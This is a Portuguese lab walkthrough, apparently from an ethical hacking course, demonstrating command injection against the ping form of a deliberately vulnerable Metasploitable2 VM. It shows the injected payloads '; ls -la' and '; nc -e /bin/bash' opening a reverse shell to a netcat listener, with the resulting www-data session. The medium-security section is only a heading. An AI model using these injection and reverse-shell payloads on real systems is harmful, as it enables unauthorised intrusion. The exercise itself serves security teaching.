# Command Injection

Esse exercício é realizado na VM do metasploit2. 
- Após iniciar a VM, abrir on endereço IP da VM em um browser
- Selecionar o botão **Command Execution**

![command execution](https://github.com/ops-shadow/Complete-Ethical-Hacking-Bootcamp/blob/74d17509f3dfd75aa6f5ac594284f5f19b786f24/7%20-%20websites/ci_1.png)

## Segurança baixa

Para executar o camando ping basta entra o IP desejado e clicar em *submit*

![ping](https://github.com/ops-shadow/Complete-Ethical-Hacking-Bootcamp/blob/74d17509f3dfd75aa6f5ac594284f5f19b786f24/7%20-%20websites/ci_2.png)

Em seguida obtermos o resultado:

![ping resultado](https://github.com/ops-shadow/Complete-Ethical-Hacking-Bootcamp/blob/74d17509f3dfd75aa6f5ac594284f5f19b786f24/7%20-%20websites/ci_3.png)

**A questão:** É possivel injetar comando 'alienígêna' no prompt? 
- Usando o separado ';' injetamos o comando 'ls -la'

  `192.168.1.10; ls -la`

  ![injeção de ls -la](https://github.com/ops-shadow/Complete-Ethical-Hacking-Bootcamp/blob/74d17509f3dfd75aa6f5ac594284f5f19b786f24/7%20-%20websites/ci_4.png)

- Obtemos o seguinte resultado:

  ![injeção de ls -la resultado](https://github.com/ops-shadow/Complete-Ethical-Hacking-Bootcamp/blob/74d17509f3dfd75aa6f5ac594284f5f19b786f24/7%20-%20websites/ci_5.png)

Assim, é possível injetar umcomando malicioso no prompt.
- Para obter um sessão netcat com o alvo, iniciamos o netcat em modo listener em nossa máquina.

  `nc -lvp 12345` - onde 12345 é a porta que seleciomos para a escuta.
  ```
  └─$ nc -lvp 12345
  listening on [any] 12345 ...
  ```

- No prompt da página web, injetamos o comando netcat com a mesma porta do listener.

  `192.168.1.10; nc -e /bin/bash 192.168.1.10 12345`

  ![injeção netcat](https://github.com/ops-shadow/Complete-Ethical-Hacking-Bootcamp/blob/74d17509f3dfd75aa6f5ac594284f5f19b786f24/7%20-%20websites/ci_6.png)

- Em nosso terminal obtemos uma conexão com o VM através do netcat.
  ```
  connect to [192.168.1.10] from (UNKNOWN) [192.168.1.33] 49007
  
  whoami
  www-data
  
  id
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
  
  groups
  www-data
  
  ls -la
  total 20
  drwxr-xr-x  4 www-data www-data 4096 May 20  2012 .
  drwxr-xr-x 11 www-data www-data 4096 May 20  2012 ..
  drwxr-xr-x  2 www-data www-data 4096 May 20  2012 help
  -rw-r--r--  1 www-data www-data 1509 Mar 16  2010 index.php
  drwxr-xr-x  2 www-data www-data 4096 May 20  2012 source
  ```
## Segurança média
